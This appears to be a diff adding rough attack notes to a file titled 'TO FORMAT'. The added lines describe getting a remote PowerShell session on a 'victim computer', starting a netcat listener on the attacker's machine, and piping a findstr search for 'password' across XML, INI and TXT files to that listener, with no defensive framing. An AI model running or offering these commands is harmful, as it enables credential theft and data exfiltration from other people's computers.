@@ -1,5 +1,16 @@
 TO FORMAT
 
+1) get a remote powershell instance on the victim computer, and netcat.
+2) set the following vars:
+$ip = yourip
+$port = exfiltration_port
+$nc = /path/to/nc.exe
+
+3) on your computer:
+nc -nlp exfiltration_port > password-search.txt
+
+4) on remote computer:
+findstr /si password \*.xml \*.ini \*.txt | $nc $ip $port
 
 echo $Env:PSModulePath
 
